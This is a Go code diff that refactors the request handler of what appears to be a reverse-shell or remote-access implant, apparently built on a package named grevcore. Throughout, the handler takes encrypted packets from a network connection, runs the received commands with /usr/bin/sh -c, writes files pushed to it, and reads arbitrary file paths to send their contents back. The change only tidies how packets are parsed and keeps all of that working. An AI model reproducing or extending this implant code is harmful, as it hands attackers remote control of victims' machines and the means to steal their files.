@@ -6,7 +6,6 @@ import (
 	"log/slog"
 	"strings"
 	"path/filepath"
-	"encoding/binary"
 	"os"
 	"fmt"
 	"bytes"
@@ -53,18 +52,17 @@ func ExecuteRequest(c net.Conn, key []byte) {
 
 	for {
 		var buf bytes.Buffer
+		var resp grevcore.Packet
+
 		recv := grevcore.ReceivePacket(c, key)
 
-		if len(recv) == 0 {
+		if recv.Data == nil {
 			return
 		}
 
-		header := string(recv[:grevcore.HeaderSize])
-		received := recv[grevcore.HeaderSize:]
-
-		switch header {
+		switch recv.Header {
 		case grevcore.ShellExecHeader:
-			cmd := exec.Command("/usr/bin/sh", "-c", strings.TrimSpace(string(received)))
+			cmd := exec.Command("/usr/bin/sh", "-c", strings.TrimSpace(string(recv.Data)))
 
 			cmd.Stdout = &buf
 			cmd.Stderr = &buf
@@ -75,46 +73,35 @@ func ExecuteRequest(c net.Conn, key []byte) {
 				slog.Error("An error occured while executing the command.", slog.Any("ERROR", err))
 			}
 
-			data := buf.Bytes()
-
-			grevcore.SendPacket(c, data, key)
+			resp.Data = buf.Bytes()
 
 		case grevcore.FileReceiveHeader:
-			filenameSize	:= binary.LittleEndian.Uint16(received[:2])
-			filename	:= string(received[2:2 + filenameSize])
-
-			data 		:= received[2 + filenameSize:]
-
-			slog.Info("Writing file.", "FILE", filepath.Base(filename))
-			err := os.WriteFile(filepath.Base(filename), data, 0600)
+			slog.Info("Writing file.", "FILE", filepath.Base(recv.FileName))
+			err := os.WriteFile(filepath.Base(recv.FileName), recv.Data, 0600)
 
 			if err != nil {
-				slog.Error("An error occured while writing file.", slog.Any("ERROR", err), slog.Any("FILE", filename))
+				slog.Error("An error occured while writing file.", slog.Any("ERROR", err), slog.Any("FILE", recv.FileName))
 				return
 			}
 
 		case grevcore.FileSendHeader:
-			filenameSize	:= binary.LittleEndian.Uint16(received[:2])
-			filename	:= string(received[2:2+filenameSize])
-			data, err	:= os.ReadFile(filename)
+			resp.Header = grevcore.FileReceiveHeader
+			resp.FileName = recv.FileName
 
-			slog.Info("Sending file.", "FILE", filepath.Base(filename))
+			slog.Info("Sending file.", "FILE", recv.FileName)
+			data, err := os.ReadFile(recv.FileName)
 
 			if err != nil {
-				slog.Error("An error occured while reading file.", slog.Any("ERROR", err), slog.Any("FILE", filename))
+				slog.Error("An error occured while reading file.", slog.Any("ERROR", err), slog.Any("FILE", recv.FileName))
 				return
 			}
 
-			toSend := make([]byte, 2 + int(filenameSize) + len(data))
-
-			binary.LittleEndian.PutUint16(toSend[:2], filenameSize)
-			copy(toSend[2:filenameSize + 2], []byte(filename))
-			copy(toSend[filenameSize + 2:], data)
-
-			grevcore.SendPacket(c, toSend, key)
+			resp.Data = data
 
 		default:
-			grevcore.SendPacket(c, []byte("?"), key)
+			resp.Data = []byte("?")
 		}
+
+		grevcore.SendPacket(c, resp, key)
 	}
 }
